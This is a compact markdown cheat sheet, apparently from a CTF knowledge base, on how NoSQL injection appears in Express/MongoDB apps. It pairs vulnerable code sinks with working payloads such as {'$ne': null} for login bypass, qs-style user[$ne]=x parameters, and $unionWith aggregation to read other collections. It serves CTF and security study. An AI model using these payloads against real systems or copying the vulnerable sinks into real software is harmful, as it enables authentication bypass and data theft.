# CTF shapes — how NoSQLi actually appears

## The `htb-unearthly-shop` — the `$unionWith` aggregation

`knowledge/chains/` — the verified chain — a search endpoint accepts
an ARRAY body → `aggregate()` → `[{"$unionWith": "users"}]` reads the
users collection — `aggregation.md`.

## The login-filter — `{"user": {"$ne": null}}`

```javascript
User.findOne({username: req.body.user, password: req.body.pass})
```

The login-filter — `{"user": {"$ne": null}}` — the auth-bypass —
`auth-bypass.md`.

## The Express `qs` carrier — `user[$ne]=x`

```javascript
app.use(express.urlencoded({extended: true}))
```

`extended: true` → `qs` parses `user[$ne]=x` into `{user: {$ne: "x"}}` —
the form-carrier — `injection-points.md`.

## The search-endpoint — `POST /api/search` array-body

```javascript
Model.aggregate(req.body.pipeline)
```

The array-body → `aggregate()` — the `$unionWith`/`$lookup` surface —
`aggregation.md`.

## The filter-endpoint — `?filter[user][$ne]=x`

```javascript
Model.find(req.query.filter)
```

The query-param's `qs` object — `?filter[user][$ne]=x` —
`injection-points.md`.

## The `find` vs `findOne` — the all-vs-first

```javascript
User.find({user: req.body.user})     — all matches
User.findOne({user: req.body.user})  — first match
```

`find` returns all → the `$ne` returns every user — `mongo-specific.md`.

## The `findOneAndUpdate` — the update-side

```javascript
User.findOneAndUpdate({user: req.body.user}, {$set: {role: "admin"}})
```

The update-filter — `update-injection.md`.

## The `countDocuments` — the count-oracle

```javascript
User.countDocuments({user: req.body.user})
```

The count — the `$ne` returns the total — `mongo-specific.md`.

## The `distinct` — the unique-values

```javascript
User.distinct("role", {user: {$ne: null}})
```

`distinct` — the unique values — `mongo-specific.md`.

## The header/carrier — `X-Filter: {"$ne": null}`

```javascript
const filter = JSON.parse(req.headers['x-filter'])
Model.find(filter)
```

The header-carrier — `injection-points.md`.

## The multi-collection — `users` + `secrets` + `flag`

```javascript
db.users.find(...)
db.secrets.find(...)
db.flag.find(...)
```

Multiple collections — the `$unionWith`/`$lookup` reads the other —
`aggregation.md`.

## The expected signals — the white-box hunt

- `findOne`/`find`/`aggregate`/`updateOne` with `req.body`/`req.query`
- `express.urlencoded({extended: true})` — the qs-parser
- `mongoose.sanitizeFilter` — the sanitize
- `enableJs` config — the `$where` capability
- the `users`/`secrets`/`flag` collection names — `whitebox-hunt.md`
